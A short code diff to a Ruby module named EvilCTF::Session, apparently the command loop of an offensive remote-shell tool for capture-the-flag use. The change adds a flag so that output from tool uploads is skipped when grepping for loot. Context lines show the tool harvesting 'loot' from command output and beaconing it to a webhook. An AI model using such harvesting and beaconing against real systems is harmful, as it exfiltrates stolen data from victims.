@@ -105,6 +105,7 @@ module EvilCTF::Session
 
       loop do
         # Check global flag at the top of loop (set by Signal.trap in main)
+        last_command_was_tool_upload = false
         if defined?($evil_ctf_should_exit) && $evil_ctf_should_exit
           should_exit = true
         end
@@ -408,6 +409,7 @@ module EvilCTF::Session
                   puts "[-] Failed to stage tool '#{key}'"
                 end
               end
+              last_command_was_tool_upload = true
 
             when /^!bash$/i, /^!sh$/i
               puts '[*] Spawning local shell. Type "exit" to return.'
@@ -416,8 +418,10 @@ module EvilCTF::Session
             end
 
             # Macro expansion
+
             if command_manager.expand_macro(input, shell,
                                             webhook: session_options[:webhook])
+              last_command_was_tool_upload = false
               next
             end
 
@@ -427,11 +431,14 @@ module EvilCTF::Session
             result = shell.run(cmd)
             elapsed = Time.now - start
             puts result.output
-            matches = EvilCTF::Tools.grep_output(result.output)
-            if matches.any?
-              EvilCTF::Tools.save_loot(matches)
-              EvilCTF::Tools.beacon_loot(session_options[:webhook], matches) if session_options[:webhook]
+            unless last_command_was_tool_upload
+              matches = EvilCTF::Tools.grep_output(result.output)
+              if matches.any?
+                EvilCTF::Tools.save_loot(matches)
+                EvilCTF::Tools.beacon_loot(session_options[:webhook], matches) if session_options[:webhook]
+              end
             end
+            last_command_was_tool_upload = false
 
             logger.log_command(cmd, result, elapsed,
                                '$PID', result.exitcode || 0)
